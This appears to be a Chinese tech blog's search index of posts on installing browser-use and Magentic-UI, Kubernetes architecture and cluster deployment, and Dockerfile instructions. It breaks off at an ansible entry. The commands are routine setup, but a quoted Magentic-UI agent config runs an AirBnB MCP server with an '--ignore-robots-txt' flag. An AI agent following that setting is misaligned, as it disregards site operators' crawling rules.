<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Browser-use 安装</title>
    <url>/2025/07/07/Browser-use-%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>这次安装是通过windows安装</p>
<blockquote>
<p>官网</p>
<blockquote>
<p><a href="https://browser-use.com/">https://browser-use.com/</a></p>
</blockquote>
</blockquote>
<blockquote>
<p>github</p>
<blockquote>
<p><a href="https://github.com/browser-use/browser-use">https://github.com/browser-use/browser-use</a></p>
</blockquote>
</blockquote>
<hr>
<h2 id="安装步骤">安装步骤</h2>
<blockquote>
<p>官方安装方法：</p>
<blockquote>
<p><a href="https://github.com/browser-use/web-ui">https://github.com/browser-use/web-ui</a></p>
</blockquote>
</blockquote>
<p><code>可以先安装uv，uv比较好用：</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install uv</span><br></pre></td></tr></table></figure>
<ol>
<li>创建python虚拟环境</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m venv venv</span><br><span class="line">venv\Scripts\activate</span><br></pre></td></tr></table></figure>
<ul>
<li>退出虚拟环境</li>
</ul>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>git Browser-use的web ui项目</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/browser-use/web-ui.git</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>安装依赖项</li>
</ol>
<ul>
<li>安装 Python 包：</li>
</ul>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uv pip install -r requirements.txt</span><br><span class="line"># 新版本要安装setuptools</span><br><span class="line">uv pip install setuptools</span><br></pre></td></tr></table></figure>
<ul>
<li>在 playwright 中安装浏览器</li>
</ul>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">playwright install --with-deps</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>配置环境<br>
api配置文件</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy .env.example .env</span><br></pre></td></tr></table></figure>
<ol start="5">
<li>运行webUI</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python webui.py --ip 127.0.0.1 --port 7788</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>代码</category>
        <category>工具安装</category>
      </categories>
      <tags>
        <tag>browser-use</tag>
        <tag>浏览器ai代理</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernetes概览</title>
    <url>/2025/07/11/Kubernetes%E6%A6%82%E8%A7%88/</url>
    <content><![CDATA[<h2 id="k8s多节点集群架构图">k8s多节点集群架构图</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">         +----------------------------------------------------------------+</span><br><span class="line">         |                   Master 节点（控制平面）    	                  |</span><br><span class="line">         |                                                                |</span><br><span class="line">         |  +----------------+   +--------------+   +----------------+    |</span><br><span class="line">         |  |  API Server    |&lt;-&gt;| Scheduler    |&lt;-&gt;| Controller Mgr |    |</span><br><span class="line">         |  +----------------+   +--------------+   +----------------+    |</span><br><span class="line">         |           |                                       |            |</span><br><span class="line">         |           |                                       |            |</span><br><span class="line">         |           v                                       v            |</span><br><span class="line">         |      +--------------------+         +--------------------+     |</span><br><span class="line">         |      |       etcd         |         |     监控等服务      |     |</span><br><span class="line">         |      +--------------------+         +--------------------+     |</span><br><span class="line">         +----------------------------------------------------------------+</span><br><span class="line">                                     |</span><br><span class="line">                                     | 控制、调度、状态同步</span><br><span class="line">                                     v</span><br><span class="line">+--------------------------+   +--------------------------+   +--------------------------+</span><br><span class="line">| 🖥️ Node 1（工作节点）     |   | 🖥️ Node 2（工作节点）    |   | 🖥️ Node 3（工作节点）     |</span><br><span class="line">| +----------------------+ |   | +----------------------+ |   | +----------------------+ |</span><br><span class="line">| |       kubelet        | |   | |       kubelet        | |   | |       kubelet        | |</span><br><span class="line">| |     kube-proxy       | |   | |     kube-proxy       | |   | |     kube-proxy       | |</span><br><span class="line">| | containerd/Docker    | |   | | containerd/Docker    | |   | | containerd/Docker    | |</span><br><span class="line">| | [Pod: App1, App2]    | |   | | [Pod: App3, CoreDNS] | |   | | [Pod: App4, AppX...] | |</span><br><span class="line">| +----------------------+ |   | +----------------------+ |   | +----------------------+ |</span><br><span class="line">+--------------------------+   +--------------------------+   +--------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="动作下发流程示意">动作下发流程示意</h3>
<p><code>以部署一个新 Pod 为例</code></p>
<ol>
<li>用户或系统发起请求
<ul>
<li>通过 kubectl apply -f pod.yaml 提交创建 Pod 的请求。</li>
</ul>
</li>
<li>API Server 接收请求
<ul>
<li>API Server 校验请求合法性，将 Pod 资源写入 etcd，保存集群状态。</li>
</ul>
</li>
<li>Scheduler 调度 Pod
<ul>
<li>Scheduler 监听新 Pod 资源，选择一个合适的 Node 来运行该 Pod。（Scheduler 只“打标签”，不下发命令）</li>
</ul>
</li>
<li>控制器管理器更新状态
<ul>
<li>Controller Manager 监控 Pod 状态，确保副本数和实际运行数一致。</li>
</ul>
</li>
<li>kubelet 接收指令
<ul>
<li>被 Scheduler 选中的 Node 上的 kubelet 通过 API Server 获取 Pod 运行指令。</li>
</ul>
</li>
<li>kubelet 调用容器运行时
<ul>
<li>kubelet 调用 Docker 或其他容器运行时启动 Pod 中定义的容器。</li>
</ul>
</li>
<li>Pod 运行，kubelet 持续汇报状态
<ul>
<li>kubelet 持续向 API Server 汇报容器状态，API Server 更新 etcd，保证集群状态一致</li>
</ul>
</li>
</ol>
<h3 id="类似于">类似于</h3>
<ul>
<li>API Server 是中枢大脑，接受命令，保存状态。</li>
<li>Scheduler 是派遣员，决定任务（Pod）去哪里执行。</li>
<li>Controller Manager 是监管者，确保状态符合预期。</li>
<li>kubelet 是执行官，拿到命令后具体去启动容器。</li>
</ul>
<h2 id="kube-proxy和containerd-Docker">kube-proxy和containerd/Docker</h2>
<h3 id="kube-proxy">kube-proxy</h3>
<blockquote>
<p>kube-proxy 本质上就是自动化管理节点上的「分布式防火墙 + 路由表」的工具</p>
</blockquote>
<p>它不是传统意义上的防火墙，但它借用了 Linux 的防火墙技术（iptables / ipvs）来实现服务转发和负载均衡</p>
<h4 id="举个例子">举个例子</h4>
<p>你访问了 10.96.0.10:80（某个 ClusterIP Service）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. kube-proxy 已在本机通过 iptables 建了这样的规则：</span><br><span class="line"></span><br><span class="line">   如果目标是 10.96.0.10:80，</span><br><span class="line">   随机转发到：</span><br><span class="line">     - 192.168.11.101:80 （Pod 1）</span><br><span class="line">     - 192.168.11.102:80 （Pod 2）</span><br><span class="line"></span><br><span class="line">2. 这就类似一个负载均衡 + NAT 转发行为。</span><br><span class="line"></span><br><span class="line">3. 所有规则是 kube-proxy 自动维护的，不用人手动写 iptables。</span><br></pre></td></tr></table></figure>
<blockquote>
<p>但是，kube-proxy 不是用来做安全策略限制的防火墙</p>
</blockquote>
<h4 id="总结">总结</h4>
<table>
<thead>
<tr>
<th>职责</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>🧭 <strong>服务发现路由（Service 转发）</strong></td>
<td>把虚拟的 Service IP 请求，转发给真实 Pod 的 IP</td>
</tr>
<tr>
<td>🔁 <strong>负载均衡</strong></td>
<td>在多个 Pod 之间做负载均衡：随机、轮询，具体由 <code>iptables</code> 或 <code>ipvs</code> 规则控制</td>
</tr>
<tr>
<td>🔗 <strong>节点网络配置</strong></td>
<td>为 NodePort 类型 Service 开放端口并设置本地端口转发</td>
</tr>
<tr>
<td>🧲 <strong>监听 API Server 的 Service / Endpoints 变更</strong></td>
<td>当 Pod 增加/减少时，自动更新转发规则</td>
</tr>
</tbody>
</table>
<h3 id="containerd-Docker">containerd/Docker</h3>
<blockquote>
<p><s>其实这个就是个docker</s>，但是这只是早期版本才是，现在只需要containerd</p>
</blockquote>
<h4 id="谁是谁的下层？">谁是谁的下层？</h4>
<ul>
<li>当你执行 docker run nginx，其实底层就是：
<ul>
<li>Docker CLI → Docker Engine → containerd → runc → 启动容器</li>
</ul>
</li>
</ul>
<p><code>containerd 作为后台运行容器的引擎</code></p>
<h4 id="k8s使用容器运行时">k8s使用容器运行时</h4>
<table>
<thead>
<tr>
<th>运行时</th>
<th>是否兼容 Kubernetes</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Docker</td>
<td>❌（已废弃）</td>
<td>需要安装 dockershim 适配层，K8s 1.24 起已移除</td>
</tr>
<tr>
<td>containerd</td>
<td>✅（推荐）</td>
<td>与 Kubelet 直接通过 CRI 通信，轻量、稳定、性能好</td>
</tr>
<tr>
<td>CRI-O</td>
<td>✅（OpenShift 等常用）</td>
<td>RedHat 主导，专为 Kubernetes 而生</td>
</tr>
</tbody>
</table>
<h4 id="版本变化">版本变化</h4>
<ol>
<li>
<p>早期版本（K8s ≤ 1.23）：</p>
<ul>
<li>kubelet 没有直接支持 containerd，而是通过一层叫 dockershim 的“适配器”让 Kubernetes 可以使用 Docker。</li>
<li>所以你必须装 Docker。</li>
</ul>
</li>
<li>
<p>后来（K8s ≥ 1.24）：</p>
<ul>
<li>官方移除了 dockershim。</li>
<li>Kubernetes 原生支持通过 CRI（Container Runtime Interface） 直接连接 containerd 或 CRI-O。</li>
<li>Docker 不再被官方支持作为 Kubernetes 的运行时。</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>k8s</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title>Dockerfile命令</title>
    <url>/2024/08/11/Dockerfile%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th style="text-align:center">Dockerfile</th>
<th style="text-align:left">指令	说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">FROM</td>
<td style="text-align:left">指定基础镜像，用于后续的指令构建。</td>
</tr>
<tr>
<td style="text-align:center">MAINTAINER</td>
<td style="text-align:left">指定Dockerfile的作者/维护者。（已弃用，推荐使用LABEL指令）</td>
</tr>
<tr>
<td style="text-align:center">LABEL</td>
<td style="text-align:left">添加镜像的元数据，使用键值对的形式。</td>
</tr>
<tr>
<td style="text-align:center">RUN</td>
<td style="text-align:left">在构建过程中在镜像中执行命令。</td>
</tr>
<tr>
<td style="text-align:center">CMD</td>
<td style="text-align:left">指定容器创建时的默认命令。（可以被覆盖）</td>
</tr>
<tr>
<td style="text-align:center">ENTRYPOINT</td>
<td style="text-align:left">设置容器创建时的主要命令。（不可被覆盖）</td>
</tr>
<tr>
<td style="text-align:center">EXPOSE</td>
<td style="text-align:left">声明容器运行时监听的特定网络端口。</td>
</tr>
<tr>
<td style="text-align:center">ENV</td>
<td style="text-align:left">在容器内部设置环境变量。</td>
</tr>
<tr>
<td style="text-align:center">ADD</td>
<td style="text-align:left">将文件、目录或远程URL复制到镜像中。</td>
</tr>
<tr>
<td style="text-align:center">COPY</td>
<td style="text-align:left">将文件或目录复制到镜像中。</td>
</tr>
<tr>
<td style="text-align:center">VOLUME</td>
<td style="text-align:left">为容器创建挂载点或声明卷。</td>
</tr>
<tr>
<td style="text-align:center">WORKDIR</td>
<td style="text-align:left">设置后续指令的工作目录。</td>
</tr>
<tr>
<td style="text-align:center">USER</td>
<td style="text-align:left">指定后续指令的用户上下文。</td>
</tr>
<tr>
<td style="text-align:center">ARG</td>
<td style="text-align:left">定义在构建过程中传递给构建器的变量，可使用 “docker build” 命令设置。</td>
</tr>
<tr>
<td style="text-align:center">ONBUILD</td>
<td style="text-align:left">当该镜像被用作另一个构建过程的基础时，添加触发器。</td>
</tr>
<tr>
<td style="text-align:center">STOPSIGNAL</td>
<td style="text-align:left">设置发送给容器以退出的系统调用信号。</td>
</tr>
<tr>
<td style="text-align:center">HEALTHCHECK</td>
<td style="text-align:left">定义周期性检查容器健康状态的命令。</td>
</tr>
<tr>
<td style="text-align:center">SHELL</td>
<td style="text-align:left">覆盖Docker中默认的shell，用于RUN、CMD和ENTRYPOINT指令。</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>docker命令</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernetes集群部署</title>
    <url>/2025/07/11/Kubernetes%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<h2 id="准备工作">准备工作</h2>
<p>（所有节点执行）</p>
<ul>
<li>三台ubuntu
<ul>
<li>master：192.168.11.100</li>
<li>node1：192.168.11.11</li>
<li>node2：192.168.11.22</li>
</ul>
</li>
</ul>
<h3 id="设置主机名">设置主机名</h3>
<p>（各自设置）</p>
<ol>
<li>master 节点</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> hostnamectl set-hostname master</span><br><span class="line"><span class="built_in">exec</span> bash</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>node1 节点</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> hostnamectl set-hostname node1</span><br><span class="line"><span class="built_in">exec</span> bash</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>node2 节点</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> hostnamectl set-hostname node2</span><br><span class="line"><span class="built_in">exec</span> bash</span><br></pre></td></tr></table></figure>
<h3 id="添加-hosts-解析">添加 hosts 解析</h3>
<p>（所有节点执行）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">tee</span> -a /etc/hosts &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">192.168.11.100 master</span></span><br><span class="line"><span class="string">192.168.11.11 node1</span></span><br><span class="line"><span class="string">192.168.11.22 node2</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>
<h3 id="禁用-swap">禁用 swap</h3>
<p>（所有节点）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> swapoff -a</span><br><span class="line"><span class="built_in">sudo</span> sed -i <span class="string">&#x27;/ swap / s/^/#/&#x27;</span> /etc/fstab</span><br></pre></td></tr></table></figure>
<h3 id="配置内核参数">配置内核参数</h3>
<p>（所有节点）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/modules-load.d/k8s.conf &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">br_netfilter</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> modprobe br_netfilter</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/sysctl.d/k8s.conf &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">net.bridge.bridge-nf-call-iptables = 1</span></span><br><span class="line"><span class="string">net.ipv4.ip_forward = 1</span></span><br><span class="line"><span class="string">net.bridge.bridge-nf-call-ip6tables = 1</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> sysctl --system</span><br></pre></td></tr></table></figure>
<h3 id="安装-containerd">安装 containerd</h3>
<p>（所有节点）</p>
<ol>
<li>更新 apt 源</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>安装 containerd</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install -y containerd</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>创建配置目录（如果不存在）</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p /etc/containerd</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>生成默认配置文件</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> containerd config default | <span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/containerd/config.toml</span><br></pre></td></tr></table></figure>
<ol start="5">
<li>关键：国内镜像 + systemd cgroup</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> sed -i <span class="string">&#x27;s|sandbox_image = &quot;registry.k8s.io/pause:.*&quot;|sandbox_image = &quot;registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.9&quot;|g&#x27;</span> /etc/containerd/config.toml</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> sed -i <span class="string">&#x27;s/SystemdCgroup = false/SystemdCgroup = true/g&#x27;</span> /etc/containerd/config.toml</span><br></pre></td></tr></table></figure>
<ol start="6">
<li>重启并开启 containerd 服务</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl restart containerd</span><br><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> containerd</span><br></pre></td></tr></table></figure>
<ol start="7">
<li>查看 containerd 状态确认运行中</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl status containerd</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="安装-Kubernetes">安装 Kubernetes</h2>
<h3 id="添加-Kubernetes-源">添加 Kubernetes 源</h3>
<p>（所有节点）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 添加 Kubernetes 国内 apt 源（阿里云）</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;deb [signed-by=/etc/apt/keyrings/kubernetes-apt-keyring.gpg] https://pkgs.k8s.io/core:/stable:/v1.30/deb/ /&#x27;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/apt/sources.list.d/kubernetes.list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 添加 GPG 公钥</span></span><br><span class="line">curl -fsSL https://pkgs.k8s.io/core:/stable:/v1.30/deb/Release.key | \</span><br><span class="line">  <span class="built_in">sudo</span> gpg --dearmor -o /etc/apt/keyrings/kubernetes-apt-keyring.gpg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 更新源</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get update</span><br></pre></td></tr></table></figure>
<h3 id="安装-kubelet、kubeadm、kubectl">安装 kubelet、kubeadm、kubectl</h3>
<p>（kubectl 可只在 master 装）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 安装</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install -y kubelet kubeadm kubectl</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 锁定版本，避免系统升级时自动升级</span></span><br><span class="line"><span class="built_in">sudo</span> apt-mark hold kubelet kubeadm kubectl</span><br><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> --now kubelet</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="初始化-master-节点">初始化 master 节点</h2>
<p>（只在 master 执行）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始化 master 节点</span></span><br><span class="line"><span class="built_in">sudo</span> kubeadm init \</span><br><span class="line">  --apiserver-advertise-address=192.168.11.100 \</span><br><span class="line">  --control-plane-endpoint=master \</span><br><span class="line">  --pod-network-cidr=10.244.0.0/16 \</span><br><span class="line">  --image-repository registry.cn-hangzhou.aliyuncs.com/google_containers</span><br></pre></td></tr></table></figure>
<p>如果安装中断，有残留文件，先执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo kubeadm reset -f</span><br><span class="line">sudo systemctl restart containerd</span><br><span class="line">sudo rm -rf ~/.kube /etc/kubernetes/pki /etc/kubernetes/manifests</span><br></pre></td></tr></table></figure>
<h3 id="初始化成功后，执行提示中的命令以配置-kubectl：">初始化成功后，执行提示中的命令以配置 kubectl：</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p <span class="variable">$HOME</span>/.kube</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> -i /etc/kubernetes/admin.conf <span class="variable">$HOME</span>/.kube/config</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chown</span> $(<span class="built_in">id</span> -u):$(<span class="built_in">id</span> -g) <span class="variable">$HOME</span>/.kube/config</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="安装网络插件">安装网络插件</h2>
<p>（只在 master 执行）<br>
以 calico 为例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载yaml</span></span><br><span class="line">curl -O https://raw.githubusercontent.com/projectcalico/calico/v3.27.0/manifests/calico.yaml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换为 DaoCloud 镜像</span></span><br><span class="line">sed -i <span class="string">&#x27;s|docker.io/calico/|docker.m.daocloud.io/calico/|g&#x27;</span> calico.yaml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 部署</span></span><br><span class="line">kubectl apply -f calico.yaml</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="加入节点">加入节点</h2>
<p>（在 node1 和 node2 执行）<br>
初始化 master 成功后会输出一个 <code>kubeadm join</code> 命令，形如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kubeadm <span class="built_in">join</span> 192.168.11.100:6443 --token &lt;token&gt; --discovery-token-ca-cert-hash sha256:&lt;<span class="built_in">hash</span>&gt;</span><br></pre></td></tr></table></figure>
<p>在 node1 和 node2 上运行这个命令即可加入集群。</p>
<p>如果没保存，可以在 master 上用下面命令重新获取：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kubeadm token create --print-join-command</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="验证集群状态">验证集群状态</h2>
<p>（master 上）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kubectl get nodes</span><br></pre></td></tr></table></figure>
<p>看到三台机器 <code>STATUS</code> 是 <code>Ready</code> 就说明集群搭建成功。</p>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>k8s</category>
      </categories>
      <tags>
        <tag>k8s</tag>
        <tag>kubernetes</tag>
        <tag>k8s部署</tag>
      </tags>
  </entry>
  <entry>
    <title>Magentic-UI 安装</title>
    <url>/2025/07/06/Magentic-UI-%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<blockquote>
<p>Magentic-UI：<br>
<a href="https://github.com/microsoft/Magentic-UI?tab=readme-ov-file#%EF%B8%8F-installation">https://github.com/microsoft/Magentic-UI?tab=readme-ov-file#️-installation</a></p>
</blockquote>
<hr>
<h2 id="安装">安装</h2>
<h3 id="环境准备">环境准备</h3>
<ol>
<li>需要<code>docker</code>环境，安装可参照<a href="/2024/08/09/docker%E5%AE%89%E8%A3%85/">docker 安装</a></li>
<li>安装<code>python3.12、python3.12-venv</code>
<ul>
<li>导入 Python 的稳定版 PPA，如果遇到网络问题可以使用代理<code>proxychains4</code>，不需要代理删除proxychains4即可：</li>
</ul>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 add-apt-repository ppa:deadsnakes/ppa</span><br></pre></td></tr></table></figure>
deadsnakes PPA 是由 Python 社区维护的一个软件源，专门用于提供不同版本的 Python（包括一些较新的版本），这些版本可能不在 Ubuntu 的默认软件源中。
<ul>
<li>更新 APT 缓存：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure>
<ul>
<li>安装 Python 3.12</li>
</ul>
	<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install python3.12 python3.12-venv</span><br></pre></td></tr></table></figure>
<ul>
<li>检查版本</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3.12 --version</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Magentic-UI-安装">Magentic-UI 安装</h3>
<ol>
<li>使用虚拟环境以避免与其他软件包冲突</li>
</ol>
<ul>
<li>linux</li>
</ul>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m venv .venv</span><br><span class="line">source .venv/bin/activate</span><br><span class="line">pip install magentic-ui</span><br></pre></td></tr></table></figure>
<ul>
<li>windows</li>
</ul>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m venv venv</span><br><span class="line">venv\Scripts\activate</span><br><span class="line">pip install magentic-ui</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>如果使用 uv 进行依赖项管理(较快)，则可以使用以下命令安装 Magentic-UI：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uv venv --python=3.12 .venv</span><br><span class="line">. .venv/bin/activate</span><br><span class="line">uv pip install magentic-ui</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>运行 Magentic-UI<br>
第一次运行此命令时，会构建 Docker 镜像，时间比较久；<br>
要运行 Magentic-UI，请确保 Docker 正在运行，然后运行以下命令：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">magentic-ui --port 8081 --host 0.0.0.0</span><br></pre></td></tr></table></figure>
<h3 id="venv虚拟环境进入退出">venv虚拟环境进入退出</h3>
<ol>
<li>linux</li>
</ol>
<ul>
<li>要退出虚拟环境，只需运行以下命令：</li>
</ul>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure>
<ul>
<li>想再次进入虚拟环境，只需重新激活它。到达<code>.venv的根目录</code>后，进入虚拟环境的命令如下：</li>
</ul>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source .venv/bin/activate</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>windows</li>
</ol>
<ul>
<li>退出相同，进入为</li>
</ul>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">venv\Scripts\activate</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="配置">配置</h2>
<h3 id="模型客户端配置">模型客户端配置</h3>
<ul>
<li>如果要使用不同的 OpenAI 密钥，或者想要配置与 Azure OpenAI 或 Ollama 的使用，<code>可以在 UI 中执行</code>此作，方法是导航到设置（右上角图标）并使用下面的文件格式更改模型配置。</li>
<li>您还可以在 UI 中创建并导入它，或在启动时将 Magentic-UI 指向其路径：config.yamlconfig.yaml  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">magentic-ui --config path/to/config.yaml</span><br></pre></td></tr></table></figure>
官方给出了 OpenAI 的示例：config.yaml <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># config.yaml</span><br><span class="line"></span><br><span class="line">######################################</span><br><span class="line"># Default OpenAI model configuration #</span><br><span class="line">######################################</span><br><span class="line">model_config: &amp;client</span><br><span class="line">  provider: autogen_ext.models.openai.OpenAIChatCompletionClient</span><br><span class="line">  config:</span><br><span class="line">    model: gpt-4o</span><br><span class="line">    api_key: &lt;YOUR API KEY&gt;</span><br><span class="line">    max_retries: 10</span><br><span class="line"></span><br><span class="line">##########################</span><br><span class="line"># Clients for each agent #</span><br><span class="line">##########################</span><br><span class="line">orchestrator_client: *client</span><br><span class="line">coder_client: *client</span><br><span class="line">web_surfer_client: *client</span><br><span class="line">file_surfer_client: *client</span><br><span class="line">action_guard_client: *client</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="MCP-服务器配置">MCP 服务器配置</h3>
<p>可以通过向多代理团队添加自定义 “McpAgents” 来扩展 Magentic-UI 的功能。每个 McpAgent 都可以访问一个或多个 MCP 服务器。可以通过 .mcp_agent_configsconfig.yaml</p>
<p>官网给出的示例：<br>
例如，这里有一个名为“airbnb_surfer”的代理，它可以通过 Stdio 访问本地运行的 OpenBnb MCP 服务器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mcp_agent_configs:</span><br><span class="line">  - name: airbnb_surfer</span><br><span class="line">    description: &quot;The airbnb_surfer has direct access to AirBnB.&quot;</span><br><span class="line">    model_client: </span><br><span class="line">      provider: OpenAIChatCompletionClient</span><br><span class="line">      config:</span><br><span class="line">        model: gpt-4.1-2025-04-14</span><br><span class="line">      max_retries: 10</span><br><span class="line">    system_message: |-</span><br><span class="line">      You are AirBnb Surfer, a helpful digital assistant that can help users acces AirBnB.</span><br><span class="line"></span><br><span class="line">      You have access to a suite of tools provided by the AirBnB API. Use those tools to satisfy the users requests.</span><br><span class="line">    reflect_on_tool_use: false</span><br><span class="line">    mcp_servers:</span><br><span class="line">      - server_name: AirBnB</span><br><span class="line">        server_params:</span><br><span class="line">          type: StdioServerParams</span><br><span class="line">          command: npx</span><br><span class="line">          args:</span><br><span class="line">            - -y</span><br><span class="line">            - &quot;@openbnb/mcp-server-airbnb&quot;</span><br><span class="line">            - --ignore-robots-txt</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>代码</category>
        <category>工具安装</category>
      </categories>
      <tags>
        <tag>浏览器ai代理</tag>
        <tag>工具</tag>
        <tag>Magentic-UI</tag>
      </tags>
  </entry>
  <entry>
    <title>ansible命令</title>
    <url>/2024/08/01/ansible%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<p>ansible是一个批量执行命令的工具</p>
<h2 id="安装软件">安装软件</h2>
